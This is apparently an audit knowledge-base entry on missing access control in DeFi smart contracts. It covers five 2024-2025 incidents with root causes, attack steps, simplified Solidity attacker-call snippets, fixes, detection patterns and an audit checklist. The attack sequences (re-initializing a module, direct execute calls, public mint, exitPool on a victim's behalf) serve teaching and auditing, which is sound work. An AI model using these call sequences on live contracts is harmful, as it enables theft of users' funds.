---
# Core Classification
protocol: "generic"
chain: "ethereum, linea, zksync, base"
category: "access_control"
vulnerability_type: "missing_access_control, missing_modifier, public_mint, unvalidated_caller"

# Pattern Identity (Required)
root_cause_family: missing_access_control
pattern_key: missing_access_control | initialization | privilege_escalation | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "privilege_escalation"
affected_component: "initialization, execution, minting, pool_exit, module_core"

# Technical Primitives
primitives:
  - "missing_onlyOwner"
  - "public_mint"
  - "missing_access_control"
  - "initializeModuleCore"
  - "issueNewDs"
  - "velocore__execute"
  - "exitPool"
  - "msg_sender_validation"
  - "collateral_mint"
  - "unverified_contract"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.90
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "burn"
  - "init"
  - "mint"
  - "user"
  - "int128"
  - "public"
  - "execute"
  - "exitPool"
  - "external"
  - "onlyRole"
  - "onlyAdmin"
  - "onlyOwner"
  - "initialize"
  - "issueNewDs"
  - "onlyMinter"
path_keys:
  - "missing_access_control_on_module_initialization"
  - "missing_caller_restriction_on_core_execution_function"
  - "public_mint_function_on_collateral_token"
  - "unverified_contract_with_external_transfer_proxy"
  - "missing_msg_sender_validation_in_pool_exit"

# Context Tags
tags:
  - "defi"
  - "access-control"
  - "missing-modifier"
  - "onlyOwner"
  - "public-function"
  - "initialization"
  - "mint"
  - "collateral"
  - "exit-pool"
  - "privilege-escalation"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [CORK-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-01/CorkProtocol_exp.sol` |
| [VELOCORE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-06/Velocore_exp.sol` |
| [SHEZMU-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-09/Shezmu_exp.sol` |
| [UNVERIFIED-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-01/Unverified_b5cb_exp.sol` |
| [BAZAAR-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-01/Bazaar_exp.sol` |

---

# Access Control & Missing Authorization Patterns (2024-2025)
## Overview

Access control vulnerabilities remain the most common and easiest-to-exploit vulnerability class in DeFi. In 2024-2025, missing access control modifiers allowed attackers to: initialize core protocol modules to take ownership ($12M Cork), call privileged execution functions without restriction ($6.88M Velocore), mint unlimited collateral tokens ($4.9M Shezmu), exploit unverified proxy contracts ($2M), and exit pools on behalf of other users ($1.4M Bazaar). These exploits require zero sophisticated DeFi knowledge — just calling a public function. Combined losses exceed **$27M**.

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_access_control` |
| Pattern Key | `missing_access_control | initialization | privilege_escalation | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, linea, zksync, base |


## 1. Missing Access Control on Module Initialization

> **pathShape**: `atomic`

### Root Cause

When a protocol's core module initialization function (`initializeModuleCore()`) lacks an access control modifier (e.g., `onlyOwner`, `onlyAdmin`, or `initializer`), any external caller can re-initialize the module with attacker-controlled parameters. This typically grants the attacker admin privileges or allows them to issue new assets.

### Attack Scenario

1. Find `initializeModuleCore()` — verify it lacks access control
2. Call it with attacker-controlled addresses for admin, token, and config parameters
3. Now the attacker is the module admin — call privileged functions
4. Call `issueNewDs()` to create new derivative positions with attacker as beneficiary
5. Drain all protocol funds through the minted derivatives

### Vulnerable Pattern Examples

**Example 1: CorkProtocol — Missing Access Control on initializeModuleCore() ($12M, Jan 2025)** [Approx Vulnerability: CRITICAL] `@audit` [CORK-POC]

```solidity
// ❌ VULNERABLE: initializeModuleCore() has no access control
// Anyone can call it to take over the module

// Step 1: Call initializeModuleCore() — no modifier blocks this
CorkProtocol.initializeModuleCore(
    attacker_pa,          // @audit Attacker-controlled Pegged Asset
    attacker_ra,          // @audit Attacker-controlled Reserve Asset
    attacker_lv,          // @audit Attacker-controlled Liquidity Vault
    attackerExpiry,       // @audit Custom expiry
    attackerExchangeRate  // @audit Custom exchange rate — inflated
);
// @audit No onlyOwner, no onlyAdmin, no initializer modifier
// @audit Module is now "owned" by attacker's configuration

// Step 2: Issue new Depeg Swap with attacker as beneficiary
CorkProtocol.issueNewDs(
    moduleId,          // @audit Module just initialized by attacker
    attackerExpiry,    // @audit Custom expiry set in Step 1
    attackerRedeemRate,
    attackerRepurchaseRate,
    attackerDecay
);
// @audit issueNewDs() also lacks proper access control
// @audit New derivative position minted against protocol's real reserves

// Step 3: Redeem derivatives for real tokens → drain protocol
CorkProtocol.redeemExpiredLv(moduleId, attacker, amount);
// @audit $12M in real assets drained through fake derivatives
```

---

## 2. Missing Caller Restriction on Core Execution Function

> **pathShape**: `atomic`

### Root Cause

When a DEX or AMM exposes an `execute()` function that performs token swaps, liquidity operations, and balance adjustments without validating that the caller is an authorized pool or router, anyone can call it with arbitrary parameters. The function type `int128` inputs allow specifying negative amounts (withdrawals) for maximum extraction.

### Attack Scenario

1. Find the core `velocore__execute()` function — no caller restriction
2. Encode token operations with `type(int128).max` amounts (maximum withdrawal)
3. Call directly — bypass the router/pool contract entirely
4. Extract maximum possible tokens from the pool reserves

### Vulnerable Pattern Examples

**Example 2: Velocore — Missing Caller Restriction on velocore__execute() ($6.88M, Jun 2024)** [Approx Vulnerability: CRITICAL] `@audit` [VELOCORE-POC]

```solidity
// ❌ VULNERABLE: velocore__execute() callable by anyone
// No check that msg.sender is an authorized pool or router

function velocore__execute(
    address user,
    Token[] calldata tokens,
    int128[] calldata amounts,
    bytes calldata data
) external {
    // @audit NO ACCESS CONTROL — no require(msg.sender == router)
    // @audit NO modifier — no onlyPool, no onlyRouter

    for (uint256 i = 0; i < tokens.length; i++) {
        if (amounts[i] > 0) {
            tokens[i].transferFrom(user, address(this), uint128(amounts[i]));
        } else if (amounts[i] < 0) {
            tokens[i].transfer(user, uint128(-amounts[i]));
            // @audit Negative amounts = OUTBOUND transfers to attacker
        }
    }
}

// Attacker's call:
Velocore.velocore__execute(
    attacker,           // @audit user = attacker's address
    [WETH, USDC, DAI],  // @audit tokens to drain
    [type(int128).min, type(int128).min, type(int128).min],
    // @audit Maximum negative = maximum withdrawal of ALL tokens
    ""
);
// @audit $6.88M drained in a single function call
// @audit Required zero preparation — just a direct call with crafted parameters
```

---

## 3. Public Mint Function on Collateral Token

> **pathShape**: `linear-multistep`

### Root Cause

When a protocol's collateral token contract exposes a `mint()` function without an `onlyOwner` or `onlyMinter` modifier, anyone can mint unlimited tokens. If the protocol uses that token as collateral or for borrowing, the attacker can mint → deposit as collateral → borrow real assets.

### Attack Scenario

1. Identify the collateral token contract — find public `mint()` function
2. Mint a large amount of collateral tokens to attacker's address
3. Deposit the minted tokens into the lending/vault protocol
4. Borrow real assets (ETH, USDC) against the freely-minted collateral
5. Default on the loan — the collateral is worthless

### Vulnerable Pattern Examples

**Example 3: Shezmu — Public mint() on ShezmuUSD Collateral Token ($4.9M, Sep 2024)** [Approx Vulnerability: CRITICAL] `@audit` [SHEZMU-POC]

```solidity
// ❌ VULNERABLE: ShezmuUSD.mint() has no access control
// Anyone can mint unlimited collateral tokens

contract ShezmuUSD {
    function mint(address to, uint256 amount) external {
        // @audit NO onlyOwner modifier
        // @audit NO onlyMinter modifier
        // @audit NO access control at all
        _mint(to, amount);
    }
}

// Attacker's exploit:
// Step 1: Mint unlimited ShezmuUSD
ShezmuUSD.mint(attacker, 100_000_000e18);
// @audit Free money — mint 100M ShezmuUSD at zero cost

// Step 2: Deposit as collateral in Shezmu vault
ShezmuVault.deposit(100_000_000e18);
// @audit Protocol accepts freely-minted tokens as real collateral

// Step 3: Borrow real assets against fake collateral
ShezmuVault.borrow(ETH, maxBorrowable);
ShezmuVault.borrow(USDC, maxBorrowable);
// @audit Real ETH and USDC borrowed against worthless collateral

// Step 4: Transfer real assets out — never repay
// @audit $4.9M in real assets stolen
// @audit Protocol insolvent — collateral has zero real value
```

---

## 4. Unverified Contract with External Transfer Proxy

> **pathShape**: `atomic`

### Root Cause

Unverified (non-open-source) contracts on blockchain explorers can hide malicious or vulnerable logic. When such contracts implement transfer proxy functionality without proper access control, any caller can trigger transfers of tokens held by the contract. This is especially dangerous for contracts that hold user deposits or protocol reserves.

### Vulnerable Pattern Examples

**Example 4: Unverified Contract — External Transfer Proxy ($2M, Jan 2025)** [Approx Vulnerability: CRITICAL] `@audit` [UNVERIFIED-POC]

```solidity
// ❌ VULNERABLE: Unverified contract with externally callable transfer logic
// Contract 0xb5cb... holds user funds but allows external transfer calls

// From PoC analysis:
// Step 1: Identify unverified contract holding USDT + other tokens
address target = 0xb5cb...;  // Unverified on Etherscan

// Step 2: Call the externally accessible transfer function
// @audit The contract has a function that executes token transfers
// @audit with caller-controlled destination and amount parameters
// @audit No msg.sender validation — anyone can call

ITarget(target).transfer(
    USDT,               // @audit Token to drain
    attacker,           // @audit Destination = attacker
    target.USDTBalance  // @audit Amount = entire balance
);
// @audit ~$2M USDT drained
// @audit Unverified contracts are inherently high-risk — no code review possible
```

---

## 5. Missing msg.sender Validation in Pool Exit

> **pathShape**: `atomic`

### Root Cause

When a liquidity pool's `exitPool()` function accepts a `user` parameter to specify whose liquidity to withdraw but doesn't validate that `msg.sender == user`, any caller can exit the pool on behalf of another user, stealing their liquidity share.

### Attack Scenario

1. Call `exitPool(victim, maxAmount)` — specify victim's address as the user
2. Protocol withdraws victim's liquidity and sends tokens to msg.sender (or to user parameter)
3. If tokens go to user, pair the call with a secondary exploit to catch the funds

### Vulnerable Pattern Examples

**Example 5: Bazaar — Missing msg.sender Validation in exitPool() ($1.4M, Jan 2025)** [Approx Vulnerability: CRITICAL] `@audit` [BAZAAR-POC]

```solidity
// ❌ VULNERABLE: exitPool() doesn't validate msg.sender == user
// Anyone can withdraw anyone else's liquidity

function exitPool(
    address user,     // @audit Attacker specifies VICTIM's address
    uint256 amount,
    uint256 minOut
) external returns (uint256) {
    // @audit NO CHECK: require(msg.sender == user, "Not authorized")
    // @audit NO CHECK: require(msg.sender == approvedOperator[user])

    PoolPosition storage pos = positions[user];
    require(pos.balance >= amount, "Insufficient balance");

    uint256 tokenOut = _calculateExit(amount);
    pos.balance -= amount;

    // @audit Tokens sent to user — but attacker set user = victim
    // @audit In Bazaar's case, combined with other exploits to redirect
    IERC20(token).transfer(user, tokenOut);

    return tokenOut;
}

// Attacker's call:
BazaarPool.exitPool(
    victim,              // @audit user = victim's address
    victim.poolBalance,  // @audit amount = victim's entire balance
    0                    // @audit minOut = 0 (accept any amount)
);
// @audit Victim's liquidity withdrawn by attacker — $1.4M stolen
// @audit One-line exploit: just call exitPool() with victim's address
```

---

## Impact Analysis

### Technical Impact
- Missing access control requires zero technical sophistication — just call the function
- Module initialization takeover grants full admin privileges
- Public mint on collateral tokens creates systemic insolvency
- Missing caller validation enables unauthorized actions on behalf of any user
- These vulnerabilities are the easiest to exploit and the easiest to prevent

### Business Impact
- **CorkProtocol**: $12M lost — missing access control on initializeModuleCore() and issueNewDs()
- **Velocore**: $6.88M lost — missing caller restriction on velocore__execute()
- **Shezmu**: $4.9M lost — public mint() on collateral token
- **Unverified_b5cb**: $2M lost — unverified contract with external transfer proxy
- **Bazaar**: $1.4M lost — missing msg.sender validation in exitPool()
- Combined 2024-2025 access control damage: **$27M+**

### Affected Scenarios
- Protocol module initialization (particularly multi-module architectures)
- Core execution/swap functions in DEX/AMM contracts
- Collateral/staking token mint functions
- Pool exit/withdrawal functions with user parameters
- Unverified contracts holding user funds
- Any function that should be admin-only but has `external` visibility without modifiers

---

## Secure Implementation

**Fix 1: Access Control on Initialization + Module Functions**
```solidity
// ✅ SECURE: Use initializer + onlyOwner for module setup
function initializeModuleCore(
    address pa, address ra, address lv, uint256 expiry, uint256 exchangeRate
) external onlyOwner initializer {
    // @audit onlyOwner prevents random callers
    // @audit initializer prevents re-initialization
    _pa = pa;
    _ra = ra;
    _lv = lv;
    // ...
}

function issueNewDs(
    bytes32 moduleId, uint256 expiry, uint256 redeemRate, uint256 repurchaseRate, uint256 decay
) external onlyOwner {
    // @audit Only owner can issue new derivative positions
    require(modules[moduleId].initialized, "Module not initialized");
    // ...
}
```

**Fix 2: Caller Restriction on Core Execution**
```solidity
// ✅ SECURE: Whitelist authorized callers for execute()
mapping(address => bool) public authorizedPools;

function velocore__execute(
    address user, Token[] calldata tokens, int128[] calldata amounts, bytes calldata data
) external {
    require(authorizedPools[msg.sender], "Unauthorized caller");
    // @audit Only registered pools/routers can call execute
    // ...
}
```

**Fix 3: Role-Based Minting**
```solidity
// ✅ SECURE: Only authorized minters can mint
bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
    // @audit Only addresses with MINTER_ROLE can mint
    _mint(to, amount);
}
```

**Fix 4: Validate msg.sender in User-Targeted Functions**
```solidity
// ✅ SECURE: Validate caller is the user or an approved operator
function exitPool(address user, uint256 amount, uint256 minOut) external returns (uint256) {
    require(
        msg.sender == user || isApprovedOperator[user][msg.sender],
        "Not authorized"
    );
    // @audit Only the user or their approved operator can exit
    // ...
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Pattern 1: `external` function without access control modifier (onlyOwner, onlyAdmin, etc.)
- Pattern 2: `initialize()` or `init()` function callable multiple times
- Pattern 3: `mint()` / `burn()` without role-based access control
- Pattern 4: Function accepting `address user` parameter without `require(msg.sender == user)`
- Pattern 5: Core execution function (swap, execute, transfer) without caller whitelist
- Pattern 6: Unverified contracts holding >$100K in token balances
```

### Audit Checklist
- [ ] Does every state-changing function have appropriate access control?
- [ ] Is `initialize()` protected by the `initializer` modifier?
- [ ] Can `initialize()` be called more than once?
- [ ] Does `mint()` / `burn()` require a specific role?
- [ ] Do functions with `address user` parameter validate `msg.sender == user`?
- [ ] Are core execution functions restricted to authorized callers?
- [ ] Is the contract verified on relevant block explorers?
- [ ] Are admin functions separated from user functions with clear modifiers?

---

## Real-World Examples

### Known Exploits
- **CorkProtocol** — $12M — Missing access control on initializeModuleCore() and issueNewDs() — Jan 2025
- **Velocore** — $6.88M — Missing caller restriction on velocore__execute() (Linea/zkSync) — Jun 2024
- **Shezmu** — $4.9M — Public mint() function on ShezmuUSD collateral token — Sep 2024
- **Unverified_b5cb** — $2M — Unverified contract with externally callable transfer proxy — Jan 2025
- **Bazaar** — $1.4M — Missing msg.sender validation in exitPool() — Jan 2025

---

## Prevention Guidelines

### Development Best Practices
1. Apply `onlyOwner` / `onlyRole` to ALL administrative functions without exception
2. Use OpenZeppelin's `Initializable` for proxy initialization — prevents re-initialization
3. Implement role-based access control (RBAC) for mint, burn, and transfer operations
4. Always validate `msg.sender == user` when a function acts on behalf of a specified address
5. Use `AccessControl` or `Ownable2Step` from OpenZeppelin for robust permission management
6. Verify all contracts on block explorers before deploying to mainnet
7. Automated tools should flag any `external`/`public` function without access control modifiers

### Testing Requirements
- Unit test: call every admin function from non-admin address — must revert
- Unit test: call `initialize()` twice — must revert on second call
- Unit test: call `exitPool(otherUser)` from non-authorized address — must revert
- Fuzz test: random addresses calling all external functions
- Static analysis: Slither `missing-access-control` detector on all contracts
- Invariant: only MINTER_ROLE addresses can increase totalSupply

---

## Keywords for Search

`missing access control`, `missing modifier`, `onlyOwner`, `onlyAdmin`, `public mint`, `unrestricted mint`, `initializer`, `re-initialization`, `initializeModuleCore`, `issueNewDs`, `velocore__execute`, `exitPool`, `msg.sender validation`, `caller restriction`, `privilege escalation`, `unauthorized call`, `access control bypass`, `role-based access`, `MINTER_ROLE`, `unverified contract`, `transfer proxy`, `collateral mint`, `module initialization`, `Ownable2Step`, `AccessControl`

---

## Related Vulnerabilities

- `DB/general/access-control/defihacklabs-access-control-patterns.md` — Earlier access control patterns (2021-2023)
- `DB/general/initialization/defihacklabs-initialization-patterns.md` — Initialization vulnerability patterns
- `DB/general/missing-validations/defihacklabs-input-validation-patterns.md` — Input validation patterns
- `DB/general/proxy-vulnerabilities/` — Proxy-related access control issues
